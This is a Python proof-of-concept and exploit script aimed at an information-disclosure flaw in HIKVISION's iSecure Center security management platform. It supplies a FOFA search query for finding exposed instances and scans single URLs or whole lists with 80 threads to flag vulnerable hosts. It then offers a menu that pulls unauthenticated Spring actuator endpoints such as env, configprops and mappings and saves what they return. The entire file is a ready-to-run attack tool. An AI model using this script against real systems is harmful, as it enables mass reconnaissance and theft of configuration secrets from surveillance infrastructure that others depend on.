# HiKVISION 综合安防管理平台 env信息泄漏漏洞
# FOFA：icon_hash="-808437027" && product="HIKVISION-iSecure-Center" && title=="综合安防管理平台"

import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """
\x1b[38m██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗        ███████╗███╗   ██╗██╗   ██╗
\x1b[36m██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║        ██╔════╝████╗  ██║██║   ██║
\x1b[34m███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║        █████╗  ██╔██╗ ██║██║   ██║
\x1b[35m██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║        ██╔══╝  ██║╚██╗██║╚██╗ ██╔╝
\x1b[31m██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║███████╗███████╗██║ ╚████║ ╚████╔╝ 
\x1b[33m╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═══╝  ╚═══╝                                                        
                                            --author:Kucei
                                            --Version:HiKVISION 综合安防管理平台 env信息泄漏漏洞 1.0.0     
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("HiKVISION 综合安防管理平台 env信息泄漏漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/artemis-portal/artemis/env'
    try:
        res1 = requests.get(url=target+url_payload,verify=False,timeout=5)
        match = re.search(r'"server.ip":\s*"([^"]+)"',res1.text)
        print(match.group(1))
        # 匹配条件
        if res1.status_code == 200 and match.group(1) != None:
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
                print('\x1b[31m[+]\x1b[0m'+target+url_payload+'可能存在信息泄露')
                return True
        else:
            print('[-]'+target+'不存在漏洞')
            return False
    except Exception:
        print(f"{target}--请求时出错--")

def exp(target):
    ###############敏感信息设定################
    switcher = {
        '0': '/artemis-portal/artemis/env',
        '1': '/artemis-portal/artemis/metrics',
        '2': '/artemis-portal/artemis/metrics/http.server.requests',
        '3': '/artemis-portal/artemis/loggers',
        '4': '/artemis-portal/artemis/configprops',
        '5': '/artemis-portal/artemis/info',
        '6': '/artemis-portal/artemis/mappings',
        '7': '/artemis-portal/artemis/health',
        'e': '退出程序'
    }

    # 查询程序
    print("-------------正在检测可用漏洞------------")
    time.sleep(2)

    while True:
        # 循环遍历字典的键和值，并逐个输出
        for key, value in switcher.items():
            print(f"{key}-->   {value}")
        InformationName = input('请选择要查询的敏感信息【号码】：')
        if InformationName == 'e':
            print("正在退出,请等候……")
            exit()
        elif InformationName == '0':
            url_payload = switcher['0']
            url = target + url_payload
            print(url)
        elif InformationName == '1':
            url_payload = switcher['1']
            url = target + url_payload
        elif InformationName == '2':
            url_payload = switcher['2']
            url = target + url_payload
        elif InformationName == '3':
            url_payload = switcher['3']
            url = target + url_payload
        elif InformationName == '4':
            url_payload = switcher['4']
            url = target + url_payload
        elif InformationName == '5':
            url_payload = switcher['5']
            url = target + url_payload
        elif InformationName == '6':
            url_payload = switcher['6']
            url = target + url_payload
        elif InformationName == '7':
            url_payload = switcher['7']
            url = target + url_payload
        else:
            print('请输入正确的编号')
        res = requests.get(url=url,verify=False,timeout=5)
        print(res.status_code)      
        with open ('Information.txt','w',encoding='utf-8') as fp:
            for line in res.text.splitlines():
                fp.write(line + '\n')
        print('成功写入Information.txt')

if __name__ == '__main__':
    main()